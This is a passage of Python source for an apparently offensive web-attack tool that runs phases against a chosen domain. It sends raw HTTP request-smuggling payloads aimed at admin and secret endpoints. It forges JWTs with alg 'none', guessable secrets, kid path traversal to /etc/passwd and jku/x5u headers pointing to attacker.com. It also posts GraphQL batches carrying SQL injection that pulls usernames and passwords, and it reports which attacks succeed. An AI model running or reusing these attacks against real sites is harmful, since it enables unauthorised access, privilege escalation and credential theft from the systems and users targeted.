            return 0, {'error': str(e)}

    def is_blocked_page(self, content, status_code):
        """Check if this is a WAF block page"""
        block_indicators = [
            'blocked', 'forbidden', 'access denied', 'cloudflare', 'waf',
            'security', 'firewall', 'captcha', 'challenge'
        ]
        
        content_lower = content.lower()
        for indicator in block_indicators:
            if indicator in content_lower:
                return True
        return False

    async def close(self):
        """Close session"""
        if self.session:
            await self.session.close()


    
    


    #

    async def http_request_smuggling(self, domain):
        """HTTP Request Smuggling Attack"""
        print(f"\033[41m PHASE 4: HTTP Request Smuggling\033[0m")
        
        smuggling_payloads = [
            # CL.TE Attack
            f"POST / HTTP/1.1\r\nHost: {domain}\r\nContent-Length: 44\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: {domain}\r\n\r\n",
            # TE.CL Attack
            f"POST / HTTP/1.1\r\nHost: {domain}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n1a\r\nGET /admin HTTP/1.1\r\nHost: {domain}\r\n\r\n0\r\n\r\n"
            f"POST /api/users HTTP/1.1\r\nHost: {domain}\r\nContent-Length: 51\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /internal/admin HTTP/1.1\r\nHost: {domain}\r\n\r\n",
            f"POST /graphql HTTP/1.1\r\nHost: {domain}\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n23\r\nGET /api/secrets HTTP/1.1\r\nHost: {domain}\r\n\r\n0\r\n\r\n",
            f"POST / HTTP/1.1\r\nHost: {domain}\r\nContent-Length: 67\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /wp-admin HTTP/1.1\r\nHost: {domain}\r\n\r\nGET /phpmyadmin HTTP/1.1\r\nHost: {domain}\r\n\r\n",
            f"POST / HTTP/1.1\r\nHost: {domain}\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: identity\r\n\r\n5\r\nhello\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n", 
            f"POST / HTTP/1.1\r\nHost: {domain}\r\nContent-Length: 44\r\nTransfer-Encoding: chunked\r\n\r\n0;chunk-extension\r\n\r\nGET /backend HTTP/1.1\r\nHost: {domain}\r\n\r\n", 
            f"POST / HTTP/1.1\r\nHost: {domain}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n1000\r\n{'A'*1000}\r\n0\r\n\r\nGET /api/keys HTTP/1.1\r\nHost: {domain}\r\n\r\n",
            f"POST / HTTP/1.1\r\nHost: {domain}\r\nContent-Length: 44\r\nTransfer-Encoding : chunked\r\n\r\n0\r\n\r\nGET /dashboard HTTP/1.1\r\nHost: {domain}\r\n\r\n",   
            f"POST / HTTP/1.1\r\nHost: {domain}\r\nContent-Length: 4\r\nTransfer-Encoding:\tchunked\r\n\r\n1a\r\nGET /config HTTP/1.1\r\nHost: {domain}\r\n\r\n0\r\n\r\n", 
            f"POST / HTTP/1.1\r\nHost: {domain}\r\nContent-Length: 49\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nPUT /api/settings HTTP/1.1\r\nHost: {domain}\r\n\r\n",
            f"POST / HTTP/1.1\r\nHost: {domain}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n20\r\nDELETE /users/1 HTTP/1.1\r\nHost: {domain}\r\n\r\n0\r\n\r\n",
            f"POST / HTTP/1.1\r\nHost: {domain}\r\nContent-Length: 67\r\nTransfer-Encoding: chunked\r\nX-Forwarded-For: 127.0.0.1\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: {domain}\r\nX-Real-IP: 127.0.0.1\r\n\r\n",
            f"POST / HTTP/1.1\r\nHost: {domain}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n30\r\nGET /admin HTTP/1.1\r\nHost: {domain}\r\nAuthorization: Bearer admin\r\n\r\n0\r\n\r\n"

        ]
        
        working_smuggles = []
        
        for i, payload in enumerate(smuggling_payloads):
            try:
                # Create raw socket connection
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                
                ip = socket.gethostbyname(domain)
                sock.connect((ip, 80))
                sock.sendall(payload.encode())
                
                response = sock.recv(4096).decode()
                sock.close()
                
                if "200 OK" in response or "admin" in response.lower():
                    working_smuggles.append(payload)
                    print(f"{Colors.WHITE}[-] Smuggling {i+1}: {Colors.GREEN}Success{Colors.END}")
                else:
                    print(f"{Colors.WHITE}[-] Smuggling {i+1}: {Colors.RED}Failed{Colors.END}")
                    
            except Exception as e:
                print(f"{Colors.WHITE}[-] Smuggling {i+1}: {Colors.RED}ERROR - {e}{Colors.END}")
            
            await asyncio.sleep(1)
        
        await self.print_smuggling_summary_report(domain, working_smuggles)
        return working_smuggles




    
    async def print_smuggling_summary_report(self, domain, working_smuggles):
        """Print comprehensive HTTP Request Smuggling summary with actual payloads"""
        
        def print_bg_header(text, bg_color):
            import shutil
            try:
                width = shutil.get_terminal_size().columns
            except:
                width = 80
            padding = (width - len(text)) // 2
            spaces = " " * padding + text + " " * (width - len(text) - padding)
            print(f"{bg_color}{Colors.BLACK}{spaces}{Colors.END}")
        

        print_bg_header("", '\033[44m')
        print_bg_header(" HTTP REQUEST SMUGGLING ATTACK SUMMARY ", '\033[44m')
        print_bg_header("", '\033[44m')
        
        print(f"\n{Colors.CYAN}[+] Generating HTTP Smuggling summary...{Colors.END}")
        await asyncio.sleep(1)
        
        # 
        total_payloads = 14
        success_payloads = len(working_smuggles)
        success_rate = (success_payloads / total_payloads) * 100 if total_payloads > 0 else 0
        
        # STATISTICS SECTION
        print(f"\n{Colors.CYAN}{'SMUGGLING STATISTICS':<25} {'COUNT':<8} {'PERCENTAGE':<12}{Colors.END}")
        print(f"{Colors.CYAN}{'─'*25} {'─'*8} {'─'*12}{Colors.END}")
        
        print(f"{Colors.WHITE}{'Total Payloads Tested':<25}{Colors.END} {Colors.YELLOW}{total_payloads:<8}{Colors.END} {Colors.CYAN}100.0%{'':<6}{Colors.END}")
        print(f"{Colors.WHITE}{'Successful Smuggles':<25}{Colors.END} {Colors.GREEN}{success_payloads:<8}{Colors.END} {Colors.CYAN}{success_rate:6.1f}%{'':<6}{Colors.END}")
        print(f"{Colors.WHITE}{'Failed Smuggles':<25}{Colors.END} {Colors.RED}{total_payloads-success_payloads:<8}{Colors.END} {Colors.CYAN}{(100-success_rate):6.1f}%{'':<6}{Colors.END}")
        
        await asyncio.sleep(0.5)
        
        
        if working_smuggles:
            print(f"\n{Colors.GREEN}{'SUCCESSFUL SMUGGLING PAYLOADS':<25} {'TYPE':<20} {'TARGET':<25}{Colors.END}")
            print(f"{Colors.GREEN}{'─'*25} {'─'*20} {'─'*25}{Colors.END}")
            
            for i, payload in enumerate(working_smuggles, 1):
                
                if "CL.TE" in payload or "Content-Length" in payload and "Transfer-Encoding: chunked" in payload:
                    attack_type = "CL.TE ATTACK"
                elif "TE.CL" in payload:
                    attack_type = "TE.CL ATTACK"
                elif "Transfer-Encoding :" in payload or "Transfer-Encoding:\t" in payload:
                    attack_type = "OBFUSCATION ATTACK"
                elif "X-Forwarded-For" in payload or "X-Real-IP" in payload:
                    attack_type = "HEADER INJECTION"
                elif "chunk-extension" in payload:
                    attack_type = "CHUNK EXTENSION"
                else:
                    attack_type = "STANDARD SMUGGLING"
                

                target_match = re.search(r'GET\s+([^\s]+)\s+HTTP', payload)
                target_path = target_match.group(1) if target_match else "Unknown"
                
                # 
                if len(target_path) > 20:
                    target_path = target_path[:17] + "..."
                
                print(f"{Colors.WHITE}{i:>2}. Payload {i:<18}{Colors.END} {Colors.CYAN}{attack_type:<20}{Colors.END} {Colors.YELLOW}{target_path:<25}{Colors.END}")
        
        await asyncio.sleep(0.5)
        
        # PAYLOAD CATEGORIES BREAKDOWN
        categories = {
            'CL.TE Attacks': ['CL.TE'],
            'TE.CL Attacks': ['TE.CL'],  
            'Obfuscation Attacks': ['OBFUSCATION'],
            'Header Injection': ['HEADER INJECTION'],
            'Chunk Extension': ['CHUNK EXTENSION'],
            'Standard Smuggling': ['STANDARD SMUGGLING']
        }
        
        # 
        category_counts = {
            'CL.TE Attacks': 0,
            'TE.CL Attacks': 0,
            'Obfuscation Attacks': 0,
            'Header Injection': 0,
            'Chunk Extension': 0,
            'Standard Smuggling': 0
        }
        
        for payload in working_smuggles:
            if "CL.TE" in payload or ("Content-Length" in payload and "Transfer-Encoding: chunked" in payload):
                category_counts['CL.TE Attacks'] += 1
            elif "TE.CL" in payload:
                category_counts['TE.CL Attacks'] += 1
            elif "Transfer-Encoding :" in payload or "Transfer-Encoding:\t" in payload:
                category_counts['Obfuscation Attacks'] += 1
            elif "X-Forwarded-For" in payload or "X-Real-IP" in payload:
                category_counts['Header Injection'] += 1
            elif "chunk-extension" in payload:
                category_counts['Chunk Extension'] += 1
            else:
                category_counts['Standard Smuggling'] += 1
        

        active_categories = {k: v for k, v in category_counts.items() if v > 0}
        
        if active_categories:
            print(f"\n{Colors.CYAN}{'ATTACK CATEGORIES':<25} {'COUNT':<8} {'PERCENTAGE':<12}{Colors.END}")
            print(f"{Colors.CYAN}{'─'*25} {'─'*8} {'─'*12}{Colors.END}")
            
            for category, count in active_categories.items():
                percent = (count / success_payloads) * 100 if success_payloads > 0 else 0
                print(f"{Colors.WHITE}{category:<25}{Colors.END} {Colors.GREEN}{count:<8}{Colors.END} {Colors.CYAN}{percent:6.1f}%{'':<6}{Colors.END}")
        

        await asyncio.sleep(0.5)
        
        if working_smuggles:
            print(f"\n{Colors.GREEN}{'SUCCESSFUL PAYLOADS DETAILS':<80}{Colors.END}")
            print(f"{Colors.GREEN}{'─'*80}{Colors.END}")
            
            for i, payload in enumerate(working_smuggles, 1):
                # 
                method_match = re.search(r'(GET|POST|PUT|DELETE)\s+([^\s]+)\s+HTTP', payload)
                method = method_match.group(1) if method_match else "UNKNOWN"
                path = method_match.group(2) if method_match else "Unknown"
                
               
                if "CL.TE" in payload:
                    technique = "Content-Length vs Transfer-Encoding"
                elif "TE.CL" in payload:
                    technique = "Transfer-Encoding vs Content-Length"
                elif "Transfer-Encoding :" in payload:
                    technique = "Space Obfuscation"
                elif "Transfer-Encoding:\t" in payload:
                    technique = "Tab Obfuscation"
                elif "chunk-extension" in payload:
                    technique = "Chunk Extension"
                elif "X-Forwarded-For" in payload:
                    technique = "Header Injection (XFF)"
                elif "X-Real-IP" in payload:
                    technique = "Header Injection (X-Real-IP)"
                else:
                    technique = "Standard Smuggling"
                
                # 
                technique_count = sum(1 for p in working_smuggles if (
                    ("CL.TE" in p and "CL.TE" in payload) or
                    ("TE.CL" in p and "TE.CL" in payload) or
                    ("Transfer-Encoding :" in p and "Transfer-Encoding :" in payload) or
                    ("Transfer-Encoding:\t" in p and "Transfer-Encoding:\t" in payload) or
                    ("chunk-extension" in p and "chunk-extension" in payload) or
                    ("X-Forwarded-For" in p and "X-Forwarded-For" in payload) or
                    ("X-Real-IP" in p and "X-Real-IP" in payload)
                ))
                
                technique_percent = (technique_count / success_payloads) * 100 if success_payloads > 0 else 0
                
                print(f"{Colors.WHITE}{i:>2}. {method} {path:<30}{Colors.END}")
                print(f"{Colors.CYAN}    Technique: {technique:<45}{Colors.END} {Colors.YELLOW}{technique_percent:5.1f}%{'':<5}{Colors.END}")
                
              
                first_line = payload.split('\r\n')[0] if '\r\n' in payload else payload[:60]
                if len(first_line) > 50:
                    first_line = first_line[:47] + "..."
                print(f"{Colors.WHITE}    Preview: {first_line:<65}{Colors.END}")
                print()
        

        await asyncio.sleep(0.5)
        
        if working_smuggles:
            print(f"\n{Colors.CYAN}{'TECHNIQUE EFFECTIVENESS ANALYSIS':<40} {'SUCCESS':<10} {'EFFECTIVENESS':<15}{Colors.END}")
            print(f"{Colors.CYAN}{'─'*40} {'─'*10} {'─'*15}{Colors.END}")
            
            technique_stats = {}
            
            for payload in working_smuggles:
                if "CL.TE" in payload:
                    tech = "CL.TE"
                elif "TE.CL" in payload:
                    tech = "TE.CL"
                elif "Transfer-Encoding :" in payload:
                    tech = "Space Obfuscation"
                elif "Transfer-Encoding:\t" in payload:
                    tech = "Tab Obfuscation"
                elif "chunk-extension" in payload:
                    tech = "Chunk Extension"
                elif "X-Forwarded-For" in payload:
                    tech = "Header Injection"
                else:
                    tech = "Standard"
                
                technique_stats[tech] = technique_stats.get(tech, 0) + 1
            

            total_by_technique = {
                'CL.TE': 2,  # Assuming 2 CL.TE payloads in original list
                'TE.CL': 2,  # Assuming 2 TE.CL payloads
                'Space Obfuscation': 1,
                'Tab Obfuscation': 1,
                'Chunk Extension': 1,
                'Header Injection': 3,
                'Standard': 4
            }
            
            for tech, count in technique_stats.items():
                total_for_tech = total_by_technique.get(tech, 1)
                effectiveness = (count / total_for_tech) * 100
                
                effectiveness_color = Colors.GREEN if effectiveness > 50 else Colors.YELLOW if effectiveness > 25 else Colors.RED
                
                print(f"{Colors.WHITE}{tech:<40}{Colors.END} {Colors.GREEN}{count:<10}{Colors.END} {effectiveness_color}{effectiveness:6.1f}%{'':<9}{Colors.END}")
        
        # 
        await asyncio.sleep(0.5)
        
        if working_smuggles:
            target_paths = []
            for payload in working_smuggles:
                target_match = re.search(r'GET\s+([^\s]+)\s+HTTP', payload)
                if target_match:
                    target_paths.append(target_match.group(1))
            
            if target_paths:
                print(f"\n{Colors.GREEN}{'VULNERABLE TARGET PATHS':<40}{Colors.END}")
                print(f"{Colors.GREEN}{'─'*40}{Colors.END}")
                
                unique_targets = list(set(target_paths))
                for i, target in enumerate(unique_targets[:10], 1):
                    target_display = target[:37] + "..." if len(target) > 37 else target
                    print(f"{Colors.WHITE}{i:>2}. {target_display:<37}{Colors.END}")
                
                if len(unique_targets) > 10:
                    print(f"{Colors.YELLOW}   ... and {len(unique_targets) - 10} more paths{Colors.END}")
        
        
        print()
        print_bg_header("", '\033[44m')
        print_bg_header(f" SMUGGLING COMPLETED: {success_rate:.1f}% SUCCESS RATE ", '\033[44m')
        print_bg_header(f" {success_payloads}/{total_payloads} payloads successful ", '\033[44m')
        print_bg_header("", '\033[44m')

    
    


    
    async def jwt_algorithm_confusion(self, domain):
        """JWT Algorithm Confusion Attack"""
        print(f"\033[41m PHASE 5: JWT Algorithm Confusion\033[0m")
        
        working_tokens = []
        
        try:

            test_tokens = [

                ("none_algorithm", jwt.encode(
                    {"user": "admin", "admin": True, "iat": int(time.time())},
                    "", algorithm="none"
                )),
                

                ("simple_secret", jwt.encode(
                    {"user": "admin", "role": "superuser", "iat": int(time.time())},
                    "secret", algorithm="HS256"
                )),
                
                ("domain_secret", jwt.encode(
                    {"username": "admin", "isAdmin": True, "iat": int(time.time())},
                    domain, algorithm="HS256"
                )),
                
                ("empty_secret", jwt.encode(
                    {"user": "administrator", "admin": 1, "iat": int(time.time())},
                    "", algorithm="HS256"
                )),
                
                ("null_secret", jwt.encode(
                    {"user": "admin", "access": "full", "iat": int(time.time())},
                    "null", algorithm="HS256"
                )),
                
                ("key_secret", jwt.encode(
                    {"user": "admin", "permissions": ["read", "write"], "iat": int(time.time())},
                    "key", algorithm="HS256"
                )),
                
                ("password_secret", jwt.encode(
                    {"user": "admin", "level": "admin", "iat": int(time.time())},
                    "password", algorithm="HS256"
                )),
                
                ("admin_secret", jwt.encode(
                    {"user": "superadmin", "admin": True, "iat": int(time.time())},
                    "admin", algorithm="HS256"
                )),
                
                ("jwt_secret", jwt.encode(
                    {"user": "admin", "token_type": "jwt", "iat": int(time.time())},
                    "jwt", algorithm="HS256"
                )),
                
                ("token_secret", jwt.encode(
                    {"user": "admin", "auth_type": "bearer", "iat": int(time.time())},
                    "token", algorithm="HS256"
                )),
                
                ("secret_secret", jwt.encode(
                    {"user": "admin", "secret": True, "iat": int(time.time())},
                    "secretkey", algorithm="HS256"
                )),
                
                ("RS256_with_HS256", jwt.encode(
                    {"user": "admin", "algorithm": "HS256", "iat": int(time.time())},
                    domain, algorithm="HS256"
                )),
                
                ("public_key_as_secret", jwt.encode(
                    {"user": "admin", "public_key": True, "iat": int(time.time())},
                    domain, algorithm="HS256"
                )),
                
                ("url_as_secret", jwt.encode(
                    {"user": "admin", "url_secret": True, "iat": int(time.time())},
                    f"https://{domain}", algorithm="HS256"
                )),
                
                
                ("kid_injection", jwt.encode(
                    {"user": "admin", "injection": "kid", "iat": int(time.time())},
                    "secret", algorithm="HS256", 
                    headers={"kid": "../../../etc/passwd"}
                )),
                
                ("jku_injection", jwt.encode(
                    {"user": "admin", "injection": "jku", "iat": int(time.time())},
                    "secret", algorithm="HS256", 
                    headers={"jku": "https://attacker.com/key.json"}
                )),
                
                ("x5u_injection", jwt.encode(
                    {"user": "admin", "injection": "x5u", "iat": int(time.time())},
                    "secret", algorithm="HS256", 
                    headers={"x5u": "https://attacker.com/cert.pem"}
                )),
                

                ("future_exp", jwt.encode(
                    {"user": "admin", "admin": True, "exp": int(time.time()) + 86400*365},
                    "secret", algorithm="HS256"
                )),
                
                ("past_iat", jwt.encode(
                    {"user": "admin", "admin": True, "iat": 1516239022},
                    "secret", algorithm="HS256"
                )),
                
                ("no_exp", jwt.encode(
                    {"user": "admin", "admin": True},
                    "secret", algorithm="HS256"
                )),
                
                ("super_admin", jwt.encode(
                    {"user": "admin", "admin": True, "role": "superadmin", "isAdmin": True},
                    "secret", algorithm="HS256"
                )),
                
                ("root_user", jwt.encode(
                    {"user": "root", "admin": True, "roles": ["admin", "user", "superuser"]},
                    "secret", algorithm="HS256"
                )),
                
                ("bypass_claims", jwt.encode(
                    {"user": "admin", "admin": "true", "enabled": True, "active": 1},
                    "secret", algorithm="HS256"
                )),
                
                ("uppercase_admin", jwt.encode(
                    {"User": "admin", "Admin": True},
                    "secret", algorithm="HS256"
                )),
                
                ("mixed_case", jwt.encode(
                    {"UserName": "admin", "IsAdmin": True},
                    "secret", algorithm="HS256"
                )),
                
                ("sql_injection_claim", jwt.encode(
                    {"user": "admin' OR '1'='1", "admin": True},
                    "secret", algorithm="HS256"
                )),
                
                ("xss_claim", jwt.encode(
                    {"user": "admin<script>alert(1)</script>", "admin": True},
                    "secret", algorithm="HS256"
                )),
            ]
            
            for token_name, token in test_tokens:
                
                print(f"{Colors.YELLOW}[DEBUG] {token_name}: {token[:50]}...{Colors.END}")
                
                headers = {"Authorization": f"Bearer {token}"}
                
                try:
                    async with self.session.get(f"https://{domain}/api/user", headers=headers, timeout=5, ssl=False) as response:
                        if response.status in [200, 201]:
                            working_tokens.append({"type": token_name, "token": token})
                            print(f"{Colors.WHITE}[-] JWT {token_name}: {Colors.GREEN}[success]{Colors.END}")
                        else:
                            print(f"{Colors.WHITE}[-] JWT {token_name}: {Colors.RED}[Failed]{Colors.END}")
                except:
                    print(f"{Colors.WHITE}[-] JWT {token_name}: {Colors.RED}ERROR{Colors.END}")
                
                await asyncio.sleep(0.5)
                
        except Exception as e:
            print(f"{Colors.RED}[-] JWT Error: {e}{Colors.END}")
        
      
        await self.print_jwt_summary_report(domain, working_tokens)
        return working_tokens





    
    async def print_jwt_summary_report(self, domain, working_tokens):
        """Print comprehensive JWT algorithm confusion summary"""
        
        def print_bg_header(text, bg_color):
            import shutil
            try:
                width = shutil.get_terminal_size().columns
            except:
                width = 80
            padding = (width - len(text)) // 2
            spaces = " " * padding + text + " " * (width - len(text) - padding)
            print(f"{bg_color}{Colors.BLACK}{spaces}{Colors.END}")
        
        
        print_bg_header("", '\033[44m')
        print_bg_header(" JWT ALGORITHM CONFUSION ATTACK SUMMARY ", '\033[44m')
        print_bg_header("", '\033[44m')
        
        print(f"\n{Colors.CYAN}[+] Generating JWT attack summary...{Colors.END}")
        await asyncio.sleep(1)
        
        
        total_payloads = 25  
        success_payloads = len(working_tokens)
        success_rate = (success_payloads / total_payloads) * 100 if total_payloads > 0 else 0
        
        
        print(f"\n{Colors.CYAN}{'JWT ATTACK STATISTICS':<25} {'COUNT':<8} {'PERCENTAGE':<12}{Colors.END}")
        print(f"{Colors.CYAN}{'─'*25} {'─'*8} {'─'*12}{Colors.END}")
        
        print(f"{Colors.WHITE}{'Total Payloads Tested':<25}{Colors.END} {Colors.YELLOW}{total_payloads:<8}{Colors.END} {Colors.CYAN}100.0%{'':<6}{Colors.END}")
        print(f"{Colors.WHITE}{'Successful Payloads':<25}{Colors.END} {Colors.GREEN}{success_payloads:<8}{Colors.END} {Colors.CYAN}{success_rate:6.1f}%{'':<6}{Colors.END}")
        print(f"{Colors.WHITE}{'Failed Payloads':<25}{Colors.END} {Colors.RED}{total_payloads-success_payloads:<8}{Colors.END} {Colors.CYAN}{(100-success_rate):6.1f}%{'':<6}{Colors.END}")
        
        await asyncio.sleep(0.5)
        
        
        if working_tokens:
            print(f"\n{Colors.GREEN}{'SUCCESSFUL JWT PAYLOADS':<25} {'ALGORITHM':<15} {'TYPE':<20}{Colors.END}")
            print(f"{Colors.GREEN}{'─'*25} {'─'*15} {'─'*20}{Colors.END}")
            
            for i, token_data in enumerate(working_tokens, 1):
                token_type = token_data.get('type', 'Unknown')
                token = token_data.get('token', '')
                

                try:
                    decoded_header = jwt.get_unverified_header(token)
                    algorithm = decoded_header.get('alg', 'Unknown')
                except:
                    algorithm = 'Unknown'
                
                
                if 'none' in token_type:
                    attack_type = 'NONE Algorithm'
                elif 'injection' in token_type:
                    attack_type = 'Header Injection'
                elif 'exp' in token_type or 'iat' in token_type:
                    attack_type = 'Claim Manipulation'
                elif 'secret' in token_type:
                    attack_type = 'Secret Confusion'
                elif 'admin' in token_type or 'root' in token_type:
                    attack_type = 'Privilege Escalation'
                elif 'sql' in token_type or 'xss' in token_type:
                    attack_type = 'Injection Attack'
                else:
                    attack_type = 'Algorithm Confusion'
                
                print(f"{Colors.WHITE}{i:>2}. {token_type:<22}{Colors.END} {Colors.CYAN}{algorithm:<15}{Colors.END} {Colors.YELLOW}{attack_type:<20}{Colors.END}")
        
        await asyncio.sleep(0.5)
        

        categories = {
            'NONE Algorithm': ['none_algorithm'],
            'HS256 Secrets': ['simple_secret', 'domain_secret', 'empty_secret', 'null_secret', 
                             'key_secret', 'password_secret', 'admin_secret', 'jwt_secret',
                             'token_secret', 'secret_secret'],
            'Algorithm Mix': ['RS256_with_HS256', 'public_key_as_secret', 'url_as_secret'],
            'Header Injection': ['kid_injection', 'jku_injection', 'x5u_injection'],
            'Claim Manipulation': ['future_exp', 'past_iat', 'no_exp'],
            'Privilege Escalation': ['super_admin', 'root_user', 'bypass_claims', 
                                   'uppercase_admin', 'mixed_case'],
            'Injection Attacks': ['sql_injection_claim', 'xss_claim']
        }
        
        category_counts = {}
        for category, payloads in categories.items():
            count = sum(1 for token in working_tokens if token.get('type') in payloads)
            if count > 0:
                category_counts[category] = count
        
        if category_counts:
            print(f"\n{Colors.CYAN}{'ATTACK CATEGORIES':<25} {'COUNT':<8} {'PERCENTAGE':<12}{Colors.END}")
            print(f"{Colors.CYAN}{'─'*25} {'─'*8} {'─'*12}{Colors.END}")
            
            for category, count in category_counts.items():
                percent = (count / success_payloads) * 100 if success_payloads > 0 else 0
                print(f"{Colors.WHITE}{category:<25}{Colors.END} {Colors.GREEN}{count:<8}{Colors.END} {Colors.CYAN}{percent:6.1f}[%]{'':<6}{Colors.END}")
        
        
        print()
        print_bg_header("", '\033[44m')
        print_bg_header(f" JWT ATTACK COMPLETED: {success_rate:.1f}% SUCCESS RATE ", '\033[44m')
        print_bg_header(f" {success_payloads}/{total_payloads} payloads successful ", '\033[44m')
        print_bg_header("", '\033[44m')    
    





    async def graphql_batching_bypass(self, domain):
        """GraphQL Query Batching Bypass"""
        print(f"\033[41m PHASE 6: GraphQL Batching Bypass\033[0m")
        
        working_queries = []
        
        # GraphQL payloads with more techniques
        graphql_payloads = [
            # Basic query batching
            [
                {"query": "query { user(id: \"1\") { name email } }"},
                {"query": "query { user(id: \"1' UNION SELECT username,password FROM users--\") { id } }"}
            ],
            # Array batching with SQL injection
            {
                "query": "query BatchGetUsers($ids: [ID!]!) { users(ids: $ids) { id name email password } }",
                "variables": {"ids": ["1", "1' OR '1'='1", "admin"]}
            },
            # Mutation batching
            [
                {"query": "mutation { login(username: \"admin\", password: \"admin\") { token } }"},
                {"query": "mutation { updateUser(id: \"1\", input: {isAdmin: true}) { id } }"}
            ],
            # Introspection with injection
            {
                "query": "query { __schema { types { name fields { name } } } user(id: \"1' OR 1=1--\") { id } }"
            },
            # Aliasing attack
            {
                "query": """
                query {
                  normal: user(id: "1") { name }
                  injected: user(id: "1' UNION SELECT 1,2,3--") { id }
                }
                """
            }
        ]
        
        for i, payload in enumerate(graphql_payloads):
            try:
                headers = {
                    "Content-Type": "application/json",
                    "User-Agent": self.get_random_ua()
                }
                
                # Try multiple GraphQL endpoints
                endpoints = ['/graphql', '/api/graphql', '/v1/graphql', '/query', '/gql']
                
                for endpoint in endpoints:
                    try:
                        async with self.session.post(f"https://{domain}{endpoint}", 
                                                   json=payload, headers=headers, timeout=8, ssl=False) as response:
                            
                            content = await response.text()
                            if response.status == 200:
                                # Check for successful response patterns
                                success_indicators = [
                                    "email" in content,
                                    "password" in content,
                                    "token" in content,
                                    "admin" in content.lower(),
                                    "__schema" in content,
                                    "errors" not in content.lower() or len(content) > 100
                                ]
                                
                                if any(success_indicators):
                                    working_queries.append({
                                        "payload": payload,
                                        "endpoint": endpoint,
                                        "response_preview": content[:200] + "..." if len(content) > 200 else content
                                    })
                                    print(f"{Colors.WHITE}[-] GraphQL Batch {i+1} on {endpoint}: {Colors.GREEN}Success{Colors.END}")
                                    break
                    except Exception as e:
                        continue
                else:
                    print(f"{Colors.WHITE}[-] GraphQL Batch {i+1}: {Colors.RED}Failed{Colors.END}")
                        
            except Exception as e:
                print(f"{Colors.WHITE}[-] GraphQL Batch {i+1}: {Colors.RED}ERROR - {e}{Colors.END}")
            
            await asyncio.sleep(0.5)
        
        await self.print_graphql_summary_report(domain, working_queries)  
        return working_queries





    
    async def print_graphql_summary_report(self, domain, working_queries):
        """Print comprehensive GraphQL Batching Bypass summary"""
        
        def print_bg_header(text, bg_color):
            import shutil
            try:
                width = shutil.get_terminal_size().columns
            except:
                width = 80
            padding = (width - len(text)) // 2
            spaces = " " * padding + text + " " * (width - len(text) - padding)
            print(f"{bg_color}{Colors.BLACK}{spaces}{Colors.END}")
        
        
        print_bg_header("", '\033[44m')
        print_bg_header(" GRAPHQL BATCHING BYPASS ATTACK SUMMARY ", '\033[44m')
        print_bg_header("", '\033[44m')
        
        print(f"\n{Colors.CYAN}[+] Generating GraphQL Batching summary...{Colors.END}")
        await asyncio.sleep(1)
        
        
        total_payloads = 5
        success_payloads = len(working_queries)
        success_rate = (success_payloads / total_payloads) * 100 if total_payloads > 0 else 0
        
        
        print(f"\n{Colors.CYAN}{'GRAPHQL ATTACK STATISTICS':<25} {'COUNT':<8} {'PERCENTAGE':<12}{Colors.END}")
        print(f"{Colors.CYAN}{'─'*25} {'─'*8} {'─'*12}{Colors.END}")
        
        print(f"{Colors.WHITE}{'Total Payloads Tested':<25}{Colors.END} {Colors.YELLOW}{total_payloads:<8}{Colors.END} {Colors.CYAN}100.0%{'':<6}{Colors.END}")
        print(f"{Colors.WHITE}{'Successful Queries':<25}{Colors.END} {Colors.GREEN}{success_payloads:<8}{Colors.END} {Colors.CYAN}{success_rate:6.1f}%{'':<6}{Colors.END}")
        print(f"{Colors.WHITE}{'Failed Queries':<25}{Colors.END} {Colors.RED}{total_payloads-success_payloads:<8}{Colors.END} {Colors.CYAN}{(100-success_rate):6.1f}%{'':<6}{Colors.END}")
        
        await asyncio.sleep(0.5)
        
        
        if working_queries:
            print(f"\n{Colors.GREEN}{'SUCCESSFUL GRAPHQL QUERIES':<25} {'TYPE':<20} {'ENDPOINT':<15}{Colors.END}")
            print(f"{Colors.GREEN}{'─'*25} {'─'*20} {'─'*15}{Colors.END}")
            
            for i, query_data in enumerate(working_queries, 1):
                payload = query_data.get('payload', {})
                endpoint = query_data.get('endpoint', 'Unknown')
                
                
                if isinstance(payload, list):
                    if any("UNION SELECT" in str(q.get('query', '')) for q in payload):
                        attack_type = "SQL INJECTION BATCHING"
                    elif any("mutation" in str(q.get('query', '')).lower() for q in payload):
                        attack_type = "MUTATION BATCHING"
                    else:
                        attack_type = "QUERY BATCHING"
                else:
                    query_str = str(payload.get('query', ''))
                    if "__schema" in query_str:
                        attack_type = "INTROSPECTION ATTACK"
                    elif "UNION SELECT" in query_str:
                        attack_type = "SQL INJECTION"
                    elif "aliasing" in query_str.lower() or "normal:" in query_str:
                        attack_type = "ALIASING ATTACK"
                    elif "variables" in payload:
                        attack_type = "VARIABLES BATCHING"
                    else:
                        attack_type = "STANDARD QUERY"
                
                print(f"{Colors.WHITE}{i:>2}. Query {i:<18}{Colors.END} {Colors.CYAN}{attack_type:<20}{Colors.END} {Colors.YELLOW}{endpoint:<15}{Colors.END}")
        
        await asyncio.sleep(0.5)
        
        
        if working_queries:
            endpoints_found = list(set([q.get('endpoint', 'Unknown') for q in working_queries]))
            
            print(f"\n{Colors.GREEN}{'VULNERABLE GRAPHQL ENDPOINTS':<25} {'SUCCESS COUNT':<15}{Colors.END}")
            print(f"{Colors.GREEN}{'─'*25} {'─'*15}{Colors.END}")
            
            for endpoint in endpoints_found:
                count = sum(1 for q in working_queries if q.get('endpoint') == endpoint)
                print(f"{Colors.WHITE}{endpoint:<25}{Colors.END} {Colors.GREEN}{count:<15}{Colors.END}")
        
        await asyncio.sleep(0.5)
        
        
        categories = {
            'Query Batching': ['QUERY BATCHING'],
            'Mutation Batching': ['MUTATION BATCHING'],
            'SQL Injection': ['SQL INJECTION', 'SQL INJECTION BATCHING'],
            'Introspection': ['INTROSPECTION ATTACK'],
            'Aliasing Attack': ['ALIASING ATTACK'],
